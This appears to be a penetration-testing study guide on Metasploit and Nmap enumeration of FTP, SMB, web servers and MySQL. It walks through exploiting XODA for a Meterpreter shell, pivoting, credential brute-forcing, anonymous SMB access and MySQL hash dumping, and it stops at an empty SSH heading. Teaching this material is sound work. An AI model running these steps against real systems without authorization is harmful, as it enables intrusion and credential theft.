
Table Of Contents

1. [Intro to Enumeration](Enumeration.md#Enumeration)
2. [FTP Enumeration](Enumeration.md#ftp-enumeration)
3. [SMB Enumeration](Enumeration.md#smb)
4. [Web Server Enumeration](Enumeration.md#web-server-enumeration)
5. [MySQL Enumeration](Enumeration.md#mysql-enumeration)
6. [SSH Enumeration](Enumeration.md#ssh-enumeration)
7. [SMTP Enumeration](Enumeration.md#smtp-enumeration)

---
## Enumeration

Enumeration is the phase that follows host discovery and port scanning in a penetration test. In this step, the goal is to dig deeper and gather detailed information about the systems and services running on a network. This could include things like…

- Account names
- Shared resources
- Misconfigured services.

Just like the scanning phase, enumeration makes active connections to the devices on the network. Attackers typically target misconfigured or unnecessarily enabled protocols during enumeration. The purpose of this phase is to interact with these protocols, with the possibility of exploiting them in later stages of the test.

---
### Port Scanning with Auxiliary Modules

Auxiliary modules in Metasploit are primarily used for tasks like scanning, discovery, and fuzzing, which means gathering information without actually exploiting anything. These modules can scan for open ports and identify services running on those ports, like FTP, SSH, or HTTP, and are useful in both the early information-gathering stage and the post-exploitation phase of a penetration test.

---
#### Running Port Scan with Metasploit Auxiliary Modules

1. **Start Postgresql and the Metasploit console**: We need postgresql so we can interact with the Metasploit Database. 
	- You can check the status of the database connection status using `db_status`
	- Can create a workspace using `workspace -a <workspace_name>` to save progress
```
service postgresql start && msfconsole
```

2. **Find the Port Scan auxiliary modules** | You can either search metasploit for `portscan` or use the module `auxiliary/scanner/portscan/tcp` .
```
search portscan

use auxiliary/scanner/portscan/tcp
```

3. **Configure the port scan module**: For the portscan aux module, the main setting to set is the target (`RHOSTS`) and the Port(s) to scan on the target with `PORTS`.
	- You can view the different options for a module with `show options`
```
set RHOST target
```

4. **Run the scan**: Just type `run` to run the scan after you're doing with the configurations. You should be be able to view the open ports on the target.
```
run
```

 - **Note**: If you want to run a UDP scan, we’d use the ‘`udp_sweep`’ Module. You can back out, search for the module, just update the RHOST here and run the scan
#### Gaining Initial Access using Metasploit

1. **Find potential attack vectors**: Once a port scan reveals open services, the next step is to try to exploit them for initial access. For example, if port 80 is open, it likely indicates the presence of a web application. Using tools like `curl`, we can retrieve the webpage to gather information about the web application software and its services, which might reveal vulnerabilities and potential vectors.
```
curl http://target_IP
```

2. **Searching exploits in Metasploit**: If we found any software or potential areas for access. We can then search Metasploit for any available exploits for the application software. An example would be XODA which is a open-source, lightweight document management system may provide an attack vector.  Xoda has the exploit module `exploit/unix/webapp/xoda_file_upload` that can be used here.
```
search xoda

use exploit/unix/webapp/xoda_file_upload
```

3. **Configure and run the exploit**:  This module in particular needs the target (`RHOST`), the target URI/directory location (`TARGETURI`), and your attacking machine's local IP (`LHOST`).
```
set RHOST target

set TARGET URI path

set LHOST your_ip
```

4. **Run the exploit**: Type `exploit` to execute the module. After some time for the exploit to run, the meterpreter session should be available. A Meterpreter session is a payload that provides a cmd-line in Metasploit that gives us control over the target system, allowing us to run commands, perform other post-exploitation tasks like escalate privileges, etc.
```
exploit
```

 
```
meterpreter> shell
```

6. **Get the network information of the compromised machine**:  Run `ifconfig`(Linux)/`ipconfig`(Windows) to get the subnet from the target.  If the network information on the adapters is a different subnet this your current machine then its probably what you're looking for.
```
ifconfig
```

#### Pivoting

Pivoting enables attackers to route traffic through a compromised system to access otherwise unreachable networks. In Metasploit, this involves configuring routes to direct traffic from the attacker’s machine through the compromised host to hidden internal systems. Using the target’s private IP information, Meterpreter routes can be set up to explore additional internal machines and services.

1.  **Route tool** (`route add` ) = Provides manual control over adding network routes through a session. You manually specify the target subnet, netmask, and meterpreter session ID to add a route. Can use this when you know the exact subnet you want to reach and need precise control over the routes being configured.
```
route add 192.168.2.0 255.255.255.0 1
```

2.  **Autoroute tool**  (`run autoroute`) = This command adds a manual route to a specific subnet through the current Meterpreter session, similar to `route add`, but it's integrated into the autoroute tool for easier use.  Use this if you know the subnet but prefer a simpler, more Metasploit-integrated way to add it.
```
run autoroute -s 192.168.2.0/24
```

3. **Autoroute Metasploit Module** | `post/multi/manage/autoroute` | The autoroute module finds and automatically adds routes to available networks from a compromised machine's network interface without manually inputting the subnet.  Can use this when you don’t know the connected networks or want a quick, automated way to add all available routes.
```
use post/multi/manage/autoroute
set SESSION 1
run
```


### Host Discovery Scans Using Metasploit

When conducting reconnaissance or pivoting in environments where traditional tools aren't available, Metasploit offers several effective scanning modules for discovering live hosts. These methods minimize noise by targeting specific protocols, enabling quick identification of active machines.

1. **TCP Ping Sweep**: The `auxiliary/scanner/discovery/tcp_ping` module sends a **TCP SYN** packet to a specific port on multiple hosts. A **SYN/ACK** or **RST** response indicates that the host is active. This is an effective way to perform host discovery without running a complete port scan. This scan is useful when you know or suspect certain ports are available and can use them to determine which hosts are live.
```
use auxiliary/scanner/discovery/tcp_ping
set RHOSTS <target subnet>
set RPORT 80  # Can also be set to 443, 22, or other open ports
run
```

2. **ICMP Sweep:** The `auxiliary/scanner/discovery/icmp_sweep` module sends **ICMP echo requests (pings)** to determine if hosts are live. This scan works well in networks that allow ICMP traffic, but results may be limited if ping requests are blocked. This approach resembles a traditional ping sweep, providing quick feedback on which hosts respond.
```
use auxiliary/scanner/discovery/icmp_sweep
set RHOSTS <target subnet or IP range>
run
```

3. **ARP Sweep:** The `auxiliary/scanner/discovery/arp_sweep` module sends **ARP requests** to discover active hosts on the same subnet. Since ARP operates at the link layer, it isn't blocked by most firewalls, making it an effective tool for local network reconnaissance. This method is highly effective when you are within the same network segment as the target hosts, ensuring reliable discovery.
```
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS <target subnet>
run
```

**Now, you can perform another portscan. We’ll need to change the receiving port of the port scan to the assumed target.**

---
## FTP-Enumeration

FTP (File Transfer Protocol) is a TCP-based protocol using port 21 for file sharing between a server and client, commonly used for transferring files to and from web server directories. It can be enumerated or brute-forced using auxiliary tools, and while it typically requires a username and password for authentication to the FTP server, some misconfigured servers allow anonymous access. We’re generally looking for.

- Version of FTP
- Brute Force to find username/password
- Check for anonymous logins

---
##### Check FTP Version

The `auxiliary/scanner/ftp/ftp_version` auxiliary module can check for the ftp version of a service:
1. **Find and use the module**: Either search for the module '`search type:auxiliary name:ftp` ' or just use the module.
```
search type:auxiliary name:ftp

use auxiliary/scanner/ftp/ftp_version
```

2. **Configure and run the ftp version scan** | We  need to update the target `RHOSTS` but the default config is fine here. The default FTP password and username is provided but its not required. 
```
set RHOSTS 192.168.2.41
```

3. **Run the scan**: Enter `run` to run the scan. You can see the version of the FTP server through its banner. We can use this to find vulnerabilities for that software and its version. 
```
run
```

---
##### Running a FTP Brute Force

The FTP Authentication Scanner auxiliary module  (`auxiliary/scanner/ftp/ftp_login`) can  perform a brute force attack on the FTP server. The strength of the attack is dependent on the word list used.
1. **Find and use the module**: Either search for the module '`search type:auxiliary name:ftp` ' or just use the module.
```
search type:auxiliary name:ftp

use auxiliary/scanner/ftp/ftp_login
```

2. **Configure the module**: Set the RHOST, we’ll then need to either 1. Provide a `PASSWORD` or `USERNAME` to test or 2. provide a password file and username file. Metasploit provides a great wordlist so we’ll choose to import the files and set them `USER_FILE` and `PASS_FILE`.
	
	- Metasploit Users List Location = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
	- Metasploit Password List Location = `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

3. **Run the scanner**:  Enter `run` to run the scanner. Give it some time for the scanner to work, any valid credentials should display if theres a match.

##### FTP Anonymous Login

The `auxiliary/scanner/ftp/anonymous` auxiliary module can check for anonymous login with the ftp:

1. **Find and use the module**: Either search for the module '`search type:auxiliary name:ftp` ' or just use the module.
```
search type:auxiliary name:ftp

use auxiliary/scanner/ftp/anonymous
```

2. **Configure and run the ftp version scan**: We need to update the target `RHOSTS` but the default config is fine here. The default FTP password and username is provided but its not required. 
```
set RHOSTS 192.168.2.41
```

#### Login to FTP Server

You can use the FTP client utility to initiate an FTP session with the target. Use `ftp` and specify the target ip/hostname to connect. This command assumes that an FTP service is running on the target machine and listening for incoming connections on port 21. You should be prompted for a username and password to authenticate your access.

```
ftp <target>
```

**Helpful tips:** 
- `ls` = View directory
- `get <file_name.type>` = To download a file, should download to home directory by default

---
## SMB 

SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (like printers) between computers on a local network (LAN). SMB uses port 445 (TCP). It operates over TCP port 445, enabling network clients to interact with server resources. However, originally, SMB ran on top of NetBIOS using port 139. The primary function of SMB is to facilitate resource sharing, but misconfigured shares or outdated versions can expose sensitive data or allow unauthorized access.

SMB has both a service-level and share-level authentication where it can authenticate on different levels. The credentials you use need to be an actual user on that target system or domain. Normally, when you attempt to access a share and it prompts you to login in, this is can be treated as both the authentication at the share-level (\\\\Server\Share) and also against the smb service.

SMB exists in different versions. SMBv2 and SMBv3 are part of the Windows operating system by default and are generally enabled as long as file sharing or network discovery is enabled. SMBv1 is an older version known for vulnerabilities like the EternalBlue exploit. SMBv1 is disabled by default in Windows 10 and newer versions due to security concerns. However, you can enable or disable SMB versions like SMBv1 through Windows Features.

- **To check or enable SMB features**:
    - Go to **Control Panel > Programs > Turn Windows features on or off**.
    - In the dialog that appears, scroll down to find "SMB 1.0/CIFS File Sharing Support" and check or uncheck it to enable or disable SMBv1.

##### Guest Access

Guest access in SMB allows anonymous users to connect to shared resources without requiring authentication. This poses a significant security risk because unauthorized users can potentially access files or directories with little to no restriction.

In SMB, guest access can occur at two distinct levels: the service level and the share level. At the **service level**, guest access enables unauthenticated queries to the SMB service. Tools like Nmap can leverage this access to enumerate available shares, users, or supported protocols, even without valid credentials. The system treats the guest account as an anonymous login, providing limited access to metadata about the service and network configuration.

At the **share level**, guest access allows users to access specific shared folders, such as a Public directory, which might be intentionally open to all. However, more sensitive shares—such as administrative shares like C$—require elevated credentials, typically from an administrator or a privileged user. 

**Administrative Shares on Windows**

Administrative shares are hidden network shares automatically created by Windows for administrative purposes, allowing remote access to important drives and system folders. These shares are identified by a dollar sign (`$`) at the end of the share name, making them hidden from standard network browsing. Examples include
- `C$` (the root of the C: drive)
- `ADMIN$` (the Windows directory)
- `IPC$` (for inter-process communication)

These shares are primarily used for remote management tasks, file transfers, and troubleshooting. Only accounts with administrative privileges can access them.
#### IPC Share

The IPC$ (Inter-Process Communication) share is a special administrative share in Windows systems that facilitates communication between processes or applications over a network using the SMB protocol. While it isn’t accessible like standard shared folders in Windows Explorer, it plays a vital role in enabling remote communication and operations. Tools like Nmap, Metasploit can interact with the IPC$ share to enumerate network resources assisting with:
- **Enumerating network shares** (e.g., `C$`, Admin$) and identifying accessible directories.
- **Querying system information** (e.g., users, groups, and services), which provides insight into accounts or misconfigurations.
- **Providing a remote interface for commands**, such as those issued through `net use` or `net rpc`.\

When enumerating, it would be helpful to view the permissions of the IPC$ share since it can provides a clear indication of what an unauthenticated user can potentially do on the system's shared resources. 
### SMB Enumeration

SMB enumeration involves several key tasks aimed at uncovering information about the server’s configuration and resources:
- **Discover SMB Version**: Identify the supported SMB protocol version, which can indicate potential vulnerabilities or deprecated versions that are still in use.
- **Locate Available Resources (Shares)**: Enumerate all shared resources to see what files or directories the server is exposing.
- **Assess Share Permissions**: Evaluate the permissions on each share to detect misconfigurations that may allow unauthorized access.
- **Monitor Active User Sessions**: Identify current user sessions to understand who is connected and possibly gain insights into user activity.
- **Evaluate Security Measures**: Investigate how security is managed, such as checking whether guest access is enabled or disabled.

We can utilize Metasploit auxiliary modules and Nmap NSE scripts to enumerate the SMB version, shares, users and perform a brute-force attack etc. The Metasploit modules can be found with the search utility specifying the type as auxiliary and the 'smb' for the name:  `search type:auxiliary name:smb` , you could see some of the smb NSE scripts by searching the `/usr/share/nmap/scripts` directory and using an `ls` command to the `grep`  command.
```
ls -al /usr/share/nmap/scripts | grep -e “smb”
```
### SMB Brute Force

The smb_login auxiliary module (`auxiliary/scanner/smb/smb_login`) can be used to perform a brute force against the SMB service to hopefully get valid credentials. The default options for the scanner should be fine but we can set either wordlist files for both users or passwords > `USER_FILE (users) | PASS_FILE (pwds) USERPASS_FILE (Both)` or we can set individual accounts/pwds with `SMBUser`/`SMBPass`. Metasploit does provide wordlists that we can use here.

- Metasploit Users List Location = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- Metasploit Password List Location = `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
        
```
use auxiliary/scanner/smb/smb_login
set RHOSTS [target]
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

### SMB: Credentialed vs Un-credentialed Scans

When running SMB scans, the presence or absence of valid credentials can significantly affect the results. If valid credentials are available, it’s always recommended to use them for more thorough SMB enumeration. An uncredentialed scan relies on public or guest access, but if guest login is disabled, many probes will result in **access denied** errors. In contrast, a **credentialed scan** uses valid user credentials, allowing deeper access and more detailed information from the target SMB service.

- **NMap** :  Credentials can be added to Nmap SMB scripts by passing the username (`smbusername`) and password (`smbpassword`) via the `--script-args` option.
```
nmap -p445 --script=smb-enum-services --script-args smbusername=[user],smbpassword=[password] [target]
```

- **Metasploit**: In Metasploit, the credentials are supplied by setting the `SMBUser` and `SMBPass` options for the scanner.`
```
set SMBUser <username>
set SMBPass <password>
```

### SMB: Enumerate  SMB Version/ Protocols & OS

Several scripts from Nmap and an Metasploit module that can be used to identify the SMB versions, protocols, and OS details of a target system. This includes the Nmap NSE scripts `smb-protocols` and `smb-os-discovery`, as well as the Metasploit module `smb_version` (`auxiliary/scanner/smb/smb_version`).

- **NMap** – `smb-protocols`: This NSE script checks which SMB dialects (e.g., SMBv1, SMBv2, SMBv3) are supported by the server. It’s helpful for quickly identifying outdated versions like SMBv1, which is associated with known vulnerabilities such as EternalBlue.
```
nmap -p445 --script smb-protocols [target]
```

- **NMap – `smb-os-discovery`**: The script performs OS fingerprinting via the SMB service and attempts to gather detailed information about the target’s OS version, computer name/NetBIOS computer name, domain etc.
```
nmap -p445 --script smb-os-discovery [target]
```

- Metasploit – `smb_version` Module:  The smb_version module attempts to identify the SMB version in use like the smb-protocols NSE script and can also provide additional OS-related information (Windows build version or service pack etc) like the smb-os-discovery NSE script.
```
use auxiliary/scanner/smb/smb_version
set rhosts [IP]
run
```

Using these tools together provides a more complete picture: `smb-protocols` and `smb_version` help identify the SMB protocols in use, while `smb-os-discovery` and `smb_version` give insight into the target system's OS and build information.

- Note: If you see A NetBIOS name with `\x00`, this is a null terminator, a special character used to indicate the end of the string in the NetBIOS protocol. The null terminator isn't part of the name itself but is included for formatting in NetBIOS communication.

### SMB Security level

The Nmap NSE script `smb-security-mode` evaluates the security configuration of the SMB server. It determines if the server enforces security practices, such as SMB signing, and whether plaintext passwords or older authentication mechanisms are allowed.
```
nmap -p445 --script smb-security-mode [target]
```
- **User-level authentication**: Each user logs in with a unique username/password. This is the standard modern configuration.
- **Share-level authentication**: Access is granted to shared resources using a common password. This older method is vulnerable to sniffing and is rarely used today.
- **Challenge/response support**: Indicates whether the server accepts more secure password types (e.g., NTLM/LM) or only plaintext passwords, with plaintext being vulnerable to interception.
- **Message signing**: If required, it ensures all communications between client and server are cryptographically signed to prevent man-in-the-middle (MITM) and SMB relay attacks. Servers that don’t enforce signing may be exploited through negotiation attacks where signing is disabled.

### SMB: Enumerate Logged in Users

The NSE script `smb-enum-sessions` enumerates logged-in user sessions on the SMB server connected through an through an SMB share. It can help detect unauthorized or misconfigured access (like guest accounts).
```
nmap -p445 --script smb-enum-sessions [target]
```
### SMB: Enumerate Network/File Shares

There’s an Nmap NSE script `smb-enum-shares`  and the Metasploit smb_enumshares auxiliary module (`auxiliary/scanner/smb/smb_enumshares`) for enumerating shared folders and drives on the target system.  The shares  may contain valuable files along with any permission misconfigurations. Using an authenticated scan allows access to shares that might not be visible otherwise.
- **NMap**: Combine `smb-enum-shares` with the `smb-ls` script to list files within each shared folder.
```
nmap -p445 --script smb-enum-shares [target]
```
```
nmap -p445 --script smb-enum-shares,smb-ls [target]
```

- **Metasploit**:  The **smb_enumshares** module identifies and enumerates SMB shares on the target system. Enabling the `ShowFiles` option provides additional details about the contents of the shared resources, which can help identify files.
```
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS [IP]
set ShowFiles true
run
```
### SMB: Enumerate User Accounts

There's an Nmap NSE `smb-enum-users` and the Metasploit SMB_enumusers auxiliary module (`auxiliary/scanner/smb/smb_enumusers`) for enumerating users on the target. Make sure to copy down all of the users and any possible admin accounts.

- **NMap**:
```
nmap -p445 --script smb-enum-users [target]
```

- **Metasploit**: The **smb_enumusers** scanner will connect to each system via the SMB RPC service and enumerate the users on the system.
```
use auxiliary/scanner/smb/smb_enumusers
set rhosts [IP]
run
```
### SMB Group Enumeration

The Nmap NSE script `smb-enum-groups` script retrieves a list of user groups on the SMB server and users apart of those groups. It helps identify users with elevated privileges or roles that might be exploited.
```
nmap -p445 --script smb-enum-groups [target]
```
### SMB Server Statistics

The Nmap NSE script `smb-server-stats` retrieves statistical information from the SMB server, including failed login attempts, file locks, and other activity-related details. This can help in analyzing security events or detecting abnormal behavior.
```
nmap -p445 --script smb-server-stats [target]
```

### SMB Enumerate Domains

The Nmap NSE script `smb-enum-domains` enumerates domains available on the SMB server, which is important when targeting a domain controller to discover domain structures.
```
nmap -p445 --script=smb-enum-domains [target]
```

### SMB Enumerate Services

Nmap NSE script `smb-enum-services` can enumerate services on the target. The list which can reveal misconfigured or vulnerable services that could be exploited.
```
nmap -p445 --script=smb-enum-services [target]
```

### SMB Access Shares  

The **SMBClient** is a command-line utility that allows interaction with SMB shares on remote servers. It is particularly useful for accessing Windows file shares from a Linux environment.

When using SMB paths, keep in mind that double backslashes (`\\`) are required to escape special characters in the shell. A typical SMB path like `\\192.51.254.3` must be written as `\\\\192.51.254.3\\` in the command line to be interpreted correctly. You can provide a username with the `-U` option, and the utility will prompt for the password upon connection.

- **List Available Shares**:  Use the **`-L` option** to list all shares on the target server. If credentials are required, you will be prompted for a password after entering the username.
```
smbclient -L \\\\192.168.56.2\\ -U admin
```

- **Access a Specific Share**:  Connect directly to a share using the network path. After connecting, you can download files using the `get` command. By default, downloaded files will be saved to your current working directory on the local machine (likely /home/).
```
smbclient \\\\192.168.56.2\\share -U admin
```

- **Download a File from the Share**:
```
get flag
```

#### SMB Anonymous Connection (Null Session)  

Anonymous (or null session) connections allow access to certain SMB resources without authentication. 
- **smbclient**: You can use the `-N` option with the smbclient to bypass the password prompt, attempting an anonymous login. 
```
smbclient -L [target] -N
```

- **rpcclient**: This cmd-line tool allows interaction with Windows RPC (Remote Procedure Call) services over SMB, enabling queries of user accounts, shares, and domain controller details. Using `-U ""` specifies an empty username, indicating an anonymous login, and `-N` tells the client to skip the password prompt.
```
rpcclient -U "" -N [target]
```

### Samba

Samba is a Linux implementation of the SMB protocol, making it possible for Linux systems to share files and printers with Windows. The `smbd` service handles the core tasks, like managing file and printer access, authenticating users, and communicating with Windows clients. Meanwhile, `nmbd` deals with NetBIOS name resolution and network browsing, enabling devices to find and communicate with each other on a local network.

- **UDP Port 137**: Used for resolving and registering NetBIOS names so devices can recognize each other by name.
- **UDP Port 138**: Handles broadcasting messages across the network, like for group messaging or browsing shared resources.

Network browsing, managed by `nmbd`, lets devices see and access shared resources on the network as they come online. Using scanning tools like `-sV` can help identify Samba servers and find details such as workgroup names.

### nmblookup

`nmblookup` is a command from the Samba toolkit that helps you find IP addresses by querying NetBIOS names. It uses UDP to send queries either to the whole network or a specific machine.

The `-A` option allows you to target an IP address directly, making it easier to get details about a device to get information like its NetBIOS name.

```
nmblookup -A [target]
```

---
## Web-Server-Enumeration

A web server is software that is used to serve website data on the web. So when you purchase a domain, setup your site with a hosting company, the directory you store your website files is hosted/served by webserver technology.

Web servers utilize HTTP (Hypertext Transfer Protocol) to facilitate the communication between clients and the web server. HTTP is an application layer protocol that utilizes TCP port 80 for communication. When using a SSL cert it uses 443.

We can utilize auxiliary modules to enumerate the web server version, HTTP headers, brute-force directories and much more.

Examples of popular web servers are; Apache, Nginx and Microsoft IIS.


### Web Server Version 

To identify the web server version, use the `http_version` auxiliary Metasploit module. This module can also return the OS which the web server is running on. You can locate it by searching the HTTP auxiliary modules (`search type:auxiliary name:http`) or directly using `auxiliary/scanner/http/http_version`. When running the scan, if the target website uses SSL (port 443), make sure to enable SSL by setting the SSL option to `true` and adjust RPORT to 443.
```
use auxiliary/scanner/http/http_version
set RHOSTS [target]
run
```

### Analyzing HTTP Headers

HTTP headers are key-value pairs of metadata that are sent between a client and a server when an HTTP request or response is made. 

For examining HTTP headers, utilize the `http_header` auxiliary module. You can find this by searching for 'http_header' or by specifying `auxiliary/scanner/http/http_header`.

When executing the scan, consider using the IGN_HEADER option if you need to exclude specific headers from the output.
```
use auxiliary/scanner/http/http_header
set RHOSTS [target]
run
```

### Use Robots.txt to Enumerate Hidden Directories

To uncover hidden directories, start by checking the `robots.txt` file. It’s stored in the root directory of a website and tells search engines which parts of the site to avoid. Use the `robots_txt` auxiliary module for this.  Search for the module with `search robots_txt` or just use `auxiliary/scanner/http/robots_txt`.  You usually don’t have to change the scanner settings like the PATH since `robots.txt` is almost always in the root directory. 

```
use auxiliary/scanner/http/robots_txt
set RHOSTS [target]
run
```

The scan itself will reveal directories labeled 'Allow' or 'Disallow'. The disallowed directories is the hidden directories specified by the website operator to not be indexed, you can attempt to access them which could contain interesting info.

```
use auxiliary/scanner/http/dir_scanner
set RHOSTS [target]
set DICTIONARY [path_to_wordlist]
run
```


### Access Hidden Directories

Curl can be used to explore the directories.  If you see "Index of ...," it means directory listing is turned on, which lets you browse the files in that folder. This feature, common in Apache and similar servers, is handy for sharing public files.

```
curl http://target/directory/
```
- Note: If a directory is password-protected, expect a 4xx error (like 403 Forbidden) because the terminal won’t ask for login details like a web browser would.


### Brute Force to Find Directories

To discover hidden directories, use the `dir_scanner` auxiliary Metasploit module. You can find it by searching for `dir_scanner` or directly using `auxiliary/scanner/http/dir_scanner`. Additionally, the `robots_txt` auxiliary module can provide initial directory hints. The `DICTIONARY` variable should be configured to point to a text file containing common directory names: `usr/share/metasploit-framework/data/wmap/wmap_dirs.txt`. If necessary, specify a subdirectory path for targeted scanning. 

```
use auxiliary/scanner/http/dir_scanner
set RHOSTS [target]
run
```

****NOTE: In an actual pentest make sure to try each of these directories from an actual browser to see the contents***

### Brute Force to Find Additional Files

To enumerate more files, use the `files_dir` auxiliary module. Search for it using `file_dir` or access it directly with `auxiliary/scanner/http/files_dir`.  The DICTIONARY variable should be set to a default filename wordlist provided by metasploit: `/usr/share/metasploit-framework/data/wmap/wmap_files.txt`. You can get word lists from:
        
- `/usr/share/metaspolit-framework`
- `/usr/share/wordlists/`

If you want to filter by a specific file extension, you can adjust the EXT variable, but you generally don’t know what type of file you’re looking for so just leave this setting alone. 
```
use auxiliary/scanner/http/files_dir
set RHOSTS [target]
run
```

### Brute Force Password-Protected Directories

To access password-protected directories, use the `http_login` auxiliary module. You can locate it by searching for `http_login` or by navigating directly to `auxiliary/scanner/http/http_login`.

- If the target directory requires authentication, make sure to set the `AUTH_URI` variable to point to that specific directory. 
- The `DICTIONARY` variable should be set to a text file with potential usernames or passwords. 
- If you have a database of credentials, you can use it, or just stick with user and password files. 
- The brute force speed can be adjusted but be careful there but careful to avoid triggering security measures or causing a DoS.
- By default, both `USER_FILE`/`PASS_FILE` and `USERPASS_FILE` are enabled, which is redundant. To resolve this, you can clear one:

```
unset USERPASS_FILE  # This might not work
set --clear USERPASS_FILE  # This should work
```

If the default wordlists don’t yield results, try using stronger lists:

- User List: `/usr/share/metasploit-framework/data/wordlists/namelist.txt`
- Password List: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

To cut down on noise from failed login attempts, set `VERBOSE` to `false`.
```
use auxiliary/scanner/http/http_login
set RHOSTS [target]
set USER_FILE [path_to_userlist]
set PASS_FILE [path_to_passwordlist]
set --clear USERPASS_FILE
set AUTH_URI [path_to_protected_directory]
set VERBOSE false
run
```

### Alternative User Enumeration for Apache Web Servers

For user enumeration on Apache web servers, use the `apache_userdir_enum` module. You can find this module by searching for `apache_userdir_enum` or directly accessing `auxiliary/scanner/http/apache_userdir_enum`.

Apache’s `UserDir` feature is  useful for this, as it generates different error codes when a username exists versus when it doesn’t. This behavior makes it easier to pinpoint valid usernames for further brute force attempts.

To run the scan, you can use a common users wordlist like `/usr/share/metasploit-framework/data/wordlists/common_users.txt`.

```
use auxiliary/scanner/http/apache_userdir_enum
set RHOSTS [target]
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

Once you identify potential usernames from a previous brute-force attempt, you should save them in a properly formatted text file to use in further scans. To create a file that Metasploit can read effectively, copy and paste the usernames, ensuring each one is on a separate line. 

```
echo -e "username1\nusername2\nusername3..." > user.txt
```

This creates a file where each username is listed on its own line. Next, update the `USER_FILE` variable to point to this new file and rerun the scan:

```
set USER_FILE user.txt
run
```


---

## MySQL-Enumeration

MySQL is an open-source relational database management system based on SQL (Structured Query Language).It is typically used to store records, customer data, and is most commonly deployed to store web application data. If you’re setting up a site like Wordpress it would need something like MySQL. MySQL utilizes TCP port 3306 by default, however, like any service it can be hosted on any open TCP port. We can utilize auxiliary modules to enumerate the version of MySQL, perform brute-force attacks to identify passwords, execute SQL queries and much more.

### Check for MySQL Database Version

To find the MySQL database version, use the `mysql_version` auxiliary module. You can search for it using `search type:auxiliary name:mysql` or just use `auxiliary/scanner/mysql/mysql_version`. Running this scan will give you the database version and potentially the underlying OS details, which are pertinent for exploitation/post-exploitation. This scan has the RPORT set to 3306 by default,  make sure the database is active on the expected port by doing a port scan.

```
use auxiliary/scanner/mysql/mysql_version
set RHOSTS [target]
run
```

### Brute Force to Find Valid Database Credentials

To brute force MySQL login credentials, use the `mysql_login` auxiliary module. You can find it by searching `mysql_login` or use `auxiliary/scanner/mysql/mysql_login`. 
- Set `BRUTEFORCE_SPEED` to control how fast you want to attempt logins (it's set high by default). 
- Make sure to set the IP, port, and point to your username/password files. You’re usually aiming to get root access for full control on the system so you can set the `USERNAME` to 'root'. You can set the password file to a Metasploit provided one like `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`. 
- Set `VERBOSE` to off to prevent the terminal from outputting all of the failed login attempts and set enable `STOP_ON_SUCCESS` to stop once a valid login is found.

```
use auxiliary/scanner/mysql/mysql_login
set RHOSTS [target]
set USERNAME root OR set USER_FILE [path_to_userlist]
set PASS_FILE [path_to_passwordlist]
set VERBOSE false
set STOP_ON_SUCCESS true
run
```

### Basic MySQL Enumeration

For basic MySQL enumeration, use the `mysql_enum` module.  The module allows for simple enumeration on the database server as long as there’s proper credentials is provided like an admin/root account. Search with `mysql_enum` or go to `auxiliary/admin/mysql/mysql_enum`. Running this scan will give you the MySQL version, user accounts with password hashes, and each account’s privileges. If you collect any password hashes, you can try to crack them later. 

```
use auxiliary/admin/mysql/mysql_enum
set RHOSTS [target]
set USERNAME [username]
set PASSWORD [password]
run
```

**Note**: If you use non-root credentials, any information specific to that user might still be helpful.


### Interact with the MySQL Database

To run SQL queries directly, use the mysql_sql module. It also needs admin credentials. Search for it with `mysql_sql` or use `auxiliary/admin/mysql/mysql_sql`.

Set `USERNAME` and `PASSWORD` to your credentials, and you can start interacting with the database.


```
use auxiliary/admin/mysql/mysql_sql
set RHOSTS [target]
set USERNAME [admin_username]
set PASSWORD [admin_password]
run

```

**Example Query**:
```
show databases;
```


### Get the Database and Table Schema

Use the `mysql_schemadump` module to export the database schema. Search for it using `mysql_schema` or go to `auxiliary/scanner/mysql/mysql_schemadump`.

Set your `USERNAME` and `PASSWORD`. The schema will be saved in the `loot` directory in Metasploit.

```
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS [target]
set USERNAME [admin_username]
set PASSWORD [admin_password]
run
```

**Note**: Keep everything organized using Metasploit’s built-in commands. Setting up workspaces for each project is a good idea:
- `services` – Shows all discovered services.
- `loot` – Lists captured data, like schema dumps.
- `creds` – Lists any credentials you've gathered, which are key for further attacks.


### Enumerate Files on MySQL Server

To enumerate files on the MySQL server, use the mysql_file_enum auxiliary module (`auxiliary/scanner/mysql/mysql_file_enum`). This module scans for files listed in your wordlist and can help you discover sensitive information or configuration files.

Configure the module by setting the `USERNAME` and `PASSWORD` of a valid account, the target `RHOSTS`, and the `FILE_LIST` pointing to your file wordlist. You can use something like `/usr/share/metasploit-framework/data/wordlists/directory.txt` for the wordlist. Enabling `VERBOSE` can provide detailed output.

```
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME [account]
set PASSWORD [password]
set RHOSTS [target]
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```

###  Dump MySQL Password Hashes

To dump password hashes from the MySQL database, use the `mysql_hashdump` auxiliary module. This requires admin-level credentials, such as `root`. The output will include hashes that you can attempt to crack for deeper access.

```
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD [password]
set RHOSTS [target]
run
```

### Find Writable Directories on MySQL Server

To identify writable directories on the MySQL server, use the `mysql_writable_dirs` auxiliary module. This scan can reveal directories where you have write permissions, which can be useful for uploading malicious files or further exploitation.

Set the `RHOSTS` to your target, along with the `USERNAME` and `PASSWORD` of an account with the necessary privileges. Use a directory wordlist to guide the scan like '``/usr/share/metasploit-framework/data/wordlists/directory.txt'

```
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS [target]
set USERNAME root
set PASSWORD [password]
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

---
## SSH-Enumeration

